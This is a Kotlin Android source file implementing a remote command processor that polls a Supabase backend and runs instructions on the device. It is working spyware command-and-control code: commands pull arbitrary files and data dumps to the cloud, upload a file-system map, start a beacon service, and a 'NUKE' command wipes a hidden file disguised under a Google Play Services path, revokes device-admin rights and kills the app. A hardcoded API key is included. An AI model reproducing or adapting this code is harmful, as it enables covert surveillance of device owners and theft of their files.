package com.example.myandroid

import android.content.Context
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object CommandProcessor {

    suspend fun checkAndExecute(ctx: Context) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                // Fetch PENDING commands
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?status=eq.PENDING&device_id=eq.$deviceId&select=*"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")

                if (conn.responseCode == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val commands = JSONArray(resp)

                    for (i in 0 until commands.length()) {
                        val cmd = commands.getJSONObject(i)
                        processSingleCommand(ctx, cmd, supabaseKey)
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private suspend fun processSingleCommand(ctx: Context, cmd: JSONObject, key: String) {
        val id = cmd.getInt("id")
        var status = "EXECUTED"
        var errorMsg = ""
        val fileName = cmd.optString("file_name")
        val content = cmd.optString("content", "")

        try {
            when (fileName) {
                "TOAST" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                    }
                }
                "STAY_READY" -> {
                    // Content = Duration in Minutes (default 5)
                    val mins = content.toLongOrNull() ?: 5L
                    val i = android.content.Intent(ctx, BeaconService::class.java)
                    i.putExtra("duration_mins", mins)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                    status = "EXECUTED (ACTIVE FOR ${mins}M)"
                }
                "SET_INTERVAL" -> {
                    // Content = Interval in Minutes (min 15)
                    val mins = content.toLongOrNull() ?: 15L
                    val safeMins = if (mins < 15) 15L else mins
                    
                    val wm = WorkManager.getInstance(ctx)
                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .setRequiresBatteryNotLow(true)
                        .build()

                    val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()
                        
                    wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                    status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
                }
                "STOP_BEACON" -> {
                    ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                    status = "EXECUTED (STOPPED)"
                }
                "FORCE_UPLOAD" -> {
                    val modules = content.split(",").map { it.trim() }
                    CloudManager.uploadData(ctx, modules, null)
                }
                "UPLOAD_DUMPS" -> {
                    val dumps = DumpManager.getDumpsForToday()
                    var successCount = 0
                    dumps.forEach {
                        if (CloudManager.uploadFile(ctx, it)) successCount++
                    }
                    if (successCount != dumps.size) return // Retry later
                    status = "EXECUTED ($successCount FILES)"
                }
                "PULL_FILE" -> {
                    val f = File(content)
                    if (f.exists() && f.isFile) {
                        if (!CloudManager.uploadFile(ctx, f)) return // Retry later
                    } else {
                        status = "FAILED (NOT FOUND)"
                    }
                }
                "GET_SKELETON" -> {
                    val report = FileManager.generateReport()
                    CloudManager.uploadSkeleton(ctx, report, null)
                    status = "EXECUTED (SIZE: ${report.toString().length})"
                }
                "TOGGLE_FEATURE" -> {
                    if (content.contains(":")) {
                        val parts = content.split(":")
                        val stateStr = parts[1].trim().lowercase()
                        val enable = stateStr == "on" || stateStr == "true"
                        ConfigManager.setFeature(ctx, parts[0].trim(), enable)
                        status = "EXECUTED"
                    } else status = "FAILED (FORMAT)"
                }
                "CODERED" -> {
                    val i = android.content.Intent(ctx, EmergencyService::class.java)
                    i.putExtra("codes", "0")
                    i.putExtra("sender", "BACKEND")
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                }
                "NUKE" -> {
                    try {
                        File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config").deleteRecursively()
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().commit()
                        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
                        status = "EXECUTED (GOODBYE)"
                        Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
                    } catch(e: Exception) { status = "FAILED NUKE" }
                }
            }
        } catch (e: Exception) {
            status = "FAILED: ${e.message}"
            errorMsg = e.toString()
        }

        // Update DB
        try {
            val updateUrl = URL("https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?id=eq.$id")
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "PATCH"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val json = JSONObject()
            json.put("status", status)
            if (errorMsg.isNotEmpty()) json.put("error_log", errorMsg)

            conn.outputStream.use { it.write(json.toString().toByteArray()) }
            conn.responseCode
        } catch (e: Exception) { }
    }
}
